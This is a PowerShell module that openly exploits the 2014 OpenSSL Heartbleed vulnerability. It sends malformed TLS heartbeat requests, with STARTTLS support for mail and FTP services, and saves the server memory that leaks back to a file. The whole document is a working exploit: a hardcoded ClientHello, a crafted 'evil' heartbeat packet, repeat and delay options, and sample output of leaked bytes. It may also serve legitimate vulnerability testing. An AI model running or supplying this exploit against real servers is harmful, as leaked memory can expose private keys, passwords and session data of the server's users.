<#
.SYNOPSIS

Exploit the OpenSSL 1.0.1 - 1.0.1f TLS HeartBeat vulnerability.
Author: Joff Thyer, April 2014
Concept suggestion by Tim Tomes.

.DESCRIPTION

Sends a malformed TLS heartbeat request as many times as you want to and write
the returned data into a file.

.PARAMETER Computername

Either a domain name or IP address can be provided.

.PARAMETER Port

The default TCP port is 443 however any other port may be specified
here.

.PARAMETER WriteFile

If this parameter is added, a file named "$Computername-port$Port-hb.dat" will be written
containing all of the binary data retrieved for a specific computer host.

.PARAMETER TLSTries

Perform a full TLS connection to the server this many times. The default
for this parameter is 1. More data may be leaked with continued connect
attempts.

.PARAMETER Heartbeats

For a single TLS connection, send this many heartbeat requests
and gather the resulting data.  This defaults to 1 also.

.PARAMETER HBLen

The length of the malformed heartbeat packet.  Defaults to 65535 bytes.

.PARAMETER NoRandomDelay

Disable the random delay between heartbeat requests.  The random
delay will be calculated between 0 and 1000 milliseconds.

.PARAMETER Timeout

The TCP timeout for a connect request.  Also this is the
read bytes timeout during the response reading.  This will
timeout if the server does not support the TLS heartbeat function.

.PARAMETER STLSProto

Use STARTTLS and define which protocol to support.
Choices are: IMAP, POP, SMTP, FTP.  Defaults to NONE.

.LINK

http://packetstormsecurity.com/files/126070/Heartbleed-Proof-Of-Concept.html

.NOTES

Author: Joff Thyer, April 2014
Version: 20140501-1011
Acknowledgments to Tim Tomes.

.EXAMPLE

Usage example within CMD.EXE only.  Assumes that module is contained within
current working directory.

C:\>powershell -command (Import-Module ./powerbleed.psm1); Test-Heartbleed -Computername 10.10.1.150 -Verbose


Powershell interactive usage examples:

PS C:\> Import-Module ./powerbleed.psm1

PS C:\> Test-Heartbleed -Computername 10.10.1.150 -Heartbeats 5 -HBLen 32767 -Verbose
VERBOSE: Testing 10.10.1.150
VERBOSE: Sending Heartbeat support test packet
VERBOSE: Connection attempt number: 1
VERBOSE: Sending 5 TLS heartbeat packets
VERBOSE: :  2896 bytes returned from server. (2896 total bytes)
VERBOSE: : 29882 bytes returned from server. (32778 total bytes)
VERBOSE: :  8688 bytes returned from server. (41466 total bytes)
VERBOSE: : 24113 bytes returned from server. (65579 total bytes)
... some output omitted ...

Can also use the powershell pipeline to write bytes out to a file like this:

PS C:\> Test-Heartbleed -Computername 10.10.1.150 | `
              Select-Object -ExpandProperty Bytes | `
              Set-Content -Encoding Byte -Path ./file.txt

PS C:\> Test-Heartbleed -Computername 10.10.1.150 | Select-Object -ExpandProperty Bytes | Set-Content -Encoding Byte -Path ./file.txt


Or as a one line command with no pipeline with the -WriteFile argument.

PS C:\blah> Test-Heartbleed -Computername 10.10.1.150 -WriteFile
PS C:\blah> ls

    Directory: C:\blah

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---          5/1/2014  10:08 AM       5793 10.10.1.150-port443-hb.dat
-a---          5/1/2014  10:08 AM      16179 powerbleed.psm1



Other examples:

PS C:\> Test-Heartbleed -Computername 10.10.1.150 -Heartbeats 3 -TLSTries 3 -NoRandomDelay -Verbose

PS C:\> Test-Heartbleed -Computername smtp.domain.tld -Port 25 -STLSProto SMTP -Verbose
VERBOSE: Testing smtp.domain.tld
VERBOSE: Sending Heartbeat support test packet
VERBOSE: smtp.domain.tld does not support TLS heartbeat.

Host                    Bytes                        Vulnerable String
----                    -----                        ---------- ------
smtp.domain.tld         {0}                          False


#>

function Test-Heartbleed 
{
    [CmdletBinding()]
    Param(
        [Parameter(
            Mandatory=$true,
            HelpMessage = "IP address or hostname to check",
            ValueFromPipelineByPropertyName = $true,
            Position = 0)]
            [Alias('IP', 'Host', 'Computer', 'Target')]
            [string[]]$Computername,

        [Parameter(
            HelpMessage="TCP port number that SSL application is listening on",
            ValueFromPipelineByPropertyName = $true,
            Position = 1)]
            [int]$Port=443,

        [Parameter(
            HelpMessage="If this switch is enabled, binary data will be written to a file.")]
            [switch]$WriteFile = $false,

        [Parameter(
            HelpMessage="Number of TLS connection attempts to make")]
            [int]$TLSTries=1,

        [Parameter(
            HelpMessage="Number of heartbeats to send")]
            [int]$Heartbeats=1,

        [Parameter(
            HelpMessage="Length of the heartbeat packet")]
            [int]$HBLen=65535,

        [Parameter(
            HelpMessage="TCP and read connection timeout")]
            [int]$Timeout=1000,
        
        [Parameter(
            HelpMessage="Whether to randomly delay between heartbeats")]
            [switch]$NoRandomDelay=$false,
        
        [Parameter(
            HelpMessage="Enable to send the plaintext STARTTLS command.")]
            [ValidateSet("FTP","IMAP","POP","SMTP","NONE")]
            [string]$STLSProto="NONE"
    )
    Begin
    {
        # TLS V1.1 right now
        $tls_clienthello = [Byte[]] (
        0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53, 0x43, 0x5b, 0x90, 0x9d,
        0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc,
        0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00, 0x00, 0x66, 0xc0, 0x14,
        0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87, 0xc0, 0x0f,
        0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b, 0x00, 0x16,
        0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f, 0xc0, 0x1e,
        0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e, 0xc0, 0x04,
        0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02, 0x00, 0x05,
        0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06,
        0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
        0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
        0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
        0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
        0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01,
        0x01)

        
        # 32-byte heartbeat, follow by zero byte safe request.
        $safe_heartbeat = [Byte[]] (
            0x18, 0x03, 0x02, 0x00, 0x23, 
            0x01, 0x00, 0x20 + (,0x11 * 32) + `
            0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x00, 0x00
        )

        # <3 <3 <3...       
        # does not include HB length which is calculated.
        $evil_heartbeat = [Byte[]] ( 0x18, 0x03, 0x02, 0x00, 0x03, 0x01 )

        # convert HB length to byte array in proper endian order
        $n_hblen = [System.BitConverter]::GetBytes([uint16]$HBLen)
        if ([System.BitConverter]::IsLittleEndian)
        {
            [Array]::Reverse($n_hblen)
        }
    }

    Process
    {

        function _TCPConnect($timeout)
        {
            $tcp = New-Object -TypeName System.Net.Sockets.TcpClient
            $conn = $tcp.BeginConnect($IP,$Port,$null,$null)
            $wait = $conn.AsyncWaitHandle.WaitOne($Timeout,$false)
            if (!$wait) 
            {
                Throw [System.Exception] "TCP Connection Timeout Exceeded"
            }
            $tcp.EndConnect($conn)
            return $tcp
        }

        function _StartTLS($stream)
        {
            # response buffer
            $resp = New-Object -TypeName Byte[] 16384

            # send starttls if we need to
            if ($STLSProto -eq "NONE")
            {
                Return $true
            } 
            # any bytes waiting?  read them...
            $awh = $stream.BeginRead($resp,0,$resp.Length,$null,$null)
            $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
            $n = $stream.EndRead($awh)

            if ($STLSProto -eq "FTP")
            {
                $cmd = [System.Text.Encoding]::UTF8.GetBytes("AUTH TLS`r`n")
                $stream.Write($cmd,0,$cmd.Length)
                $n = $stream.Read($resp,0,$resp.length)
                if (!$resp -match "^234")
                {
                    return $false
                }
            }
            elseif ($STLSProto -eq "SMTP")
            {
                $cmd = [System.Text.Encoding]::UTF8.GetBytes("EHLO testhost`r`n")
                $stream.Write($cmd,0,$cmd.Length)
                $n = $stream.Read($resp,0,$resp.length)
                if (!$resp -match "STARTTLS")
                {
                    return $false
                }
                $cmd = [System.Text.Encoding]::UTF8.GetBytes("STARTTLS`r`n")
                $stream.Write($cmd,0,$cmd.Length)
                $n = $stream.Read($resp,0,$resp.length)
            }
            elseif ($STLSProto -eq "POP")
            {
                $cmd = [System.Text.Encoding]::UTF8.GetBytes("CAPA`r`n")
                $stream.Write($cmd,0,$cmd.Length)
                $n = $stream.Read($resp,0,$resp.length)
                if (!$resp -match "STLS")
                {
                    return $false
                }
                $cmd = [System.Text.Encoding]::UTF8.GetBytes("STLS`r`n")
                $stream.Write($cmd,0,$cmd.Length)
                $n = $stream.Read($resp,0,$resp.length)
            }
            elseif ($STLSProto -eq "IMAP")
            {
                $cmd = [System.Text.Encoding]::UTF8.GetBytes("A1 CAPABILITY`r`n")
                $stream.Write($cmd,0,$cmd.Length)
                $n = $stream.Read($resp,0,$resp.length)
                if (!$resp -match "STARTTLS")
                {
                    return $false
                }
                $cmd = [System.Text.Encoding]::UTF8.GetBytes("A2 STARTTLS`r`n")
                $stream.Write($cmd,0,$cmd.Length)
                $n = $stream.Read($resp,0,$resp.length)
            }
            return $true
        }


        # main loop here
        $ErrorActionPreference = "Continue"
        foreach($computer in $Computername)
        {
            $vulnerable = $true
            Write-Verbose -Message "Testing $($computer)"
            $IP = [System.Net.Dns]::GetHostByName($computer).AddressList[0].IPAddressToString
            $offset = 0
            $response = New-Object -TypeName Byte[] 16384
            $buf = New-Object -TypeName Byte[] 8388608

            # check for TLS heartbeat support
            Try {
                $tcp = _TCPConnect $Timeout
                $stream = $tcp.GetStream()

                # perform StartTLS if needed.
                $vulnerable = _StartTLS $stream
                    
                # send TLS client hello
                $stream.Write($tls_clienthello,0,$tls_clienthello.Length)

                # get TLS server hello
                $n = $stream.Read($response,0,$response.length)
            
                if ( $response[0] -ne 0x16) 
                {
                    Throw [System.Exception] "Malformed TLS Server Hello"
                }
    
                Write-Verbose -Message "Sending Heartbeat support test packet"
                $stream.Write($safe_heartbeat,0,$safe_heartbeat.Length)
                $awh = $stream.BeginRead($buf,$offset,$buf.length-$offset,$null,$null)
                $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
                if(!$wait) 
                {
                    Write-Verbose -Message "$($computer) does not support TLS heartbeat."
                    $vulnerable = $false
                    # don't try further connections
                    $TLSTries = 0
                }
            }
            Catch 
            {
                Throw
            }
            Finally 
            {
                if ($tcp)
                {
                    $tcp.close()
                }
            }

            # perform connection attempts
            for ($nt = 0; $nt -lt $TLSTries; $nt++) {
                $msg = "Connection attempt number: {0}" -f ($nt + 1)
                Write-Verbose -Message $msg
                Try {
                    $tcp = _TCPConnect $Timeout
                    $stream = $tcp.GetStream()

                    # perform StartTLS if needed.
                    $vulnerable = _StartTLS $stream
                    
                    # send TLS client hello
                    $stream.Write($tls_clienthello,0,$tls_clienthello.Length)

                    # get TLS server hello
                    $n = $stream.Read($response,0,$response.length)
            
                    if ( $response[0] -ne 0x16) 
                    {
                        Throw [System.Exception] "Malformed TLS Server Hello"
                    }

                    Write-Verbose -Message "Sending $($Heartbeats) TLS heartbeat packets"
                    for ($i=0; $i -lt $Heartbeats; $i++) 
                    {
                        $stream.Write($evil_heartbeat,0,$evil_heartbeat.Length)
                        $stream.Write($n_hblen,0,$n_hblen.Length)

                        $awh = $stream.BeginRead($buf,$offset,$buf.length-$offset,$null,$null)
                        $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
                
                        if(!$wait) 
                        {
                            Write-Verbose -Message "No Response to TLS HeartBeat() request on $($computer). Attempt $($nt)."
                            $vulnerable = $false
                            break
                        }
                        Try
                        {
                            $n = $stream.EndRead($awh)
                            $offset += $n
                        }
                        Catch
                        {
                            Write-Verbose -Message "Could not read response from host $($computer). Attempt $($nt)."
                            $vulnerable = $false
                            break
                        }

                        $msg = ": {0,5} bytes returned from server. ({1} total bytes)" -f $n,$offset
                        Write-Verbose -Message $msg
                
                        if (!$NoRandomDelay) 
                        {
                            $sleeptime = Get-Random -Minimum 0 -Maximum 500
                            Start-Sleep -Milliseconds $sleeptime
                        }
                    }
                }
                Catch 
                {
                    Throw
                }
                Finally
                {
                    if ($tcp)
                    {
                        $tcp.close()
                    }
                }
            }
            
            if ($WriteFile)
            {
                $cwd = Split-Path -parent $PSCommandPath
                $filename = "$cwd\\$computer-port$Port-hb.dat"
                Write-Verbose -Message "Writing binary data to $filename"
                [IO.File]::WriteAllBytes($filename,$buf[0..$offset])
            }
            
            $result = New-Object -TypeName psobject -Property @{
                "Host" = $computer
                "Vulnerable" = $vulnerable
                "Bytes" = ($buf[0..$offset])
                #"Base64" = [System.Convert]::ToBase64String($buf[0..$offset])
                "String" = [System.Text.Encoding]::ASCII.GetString(($buf[0..$offset]))
            }
            $result

        }
    }
}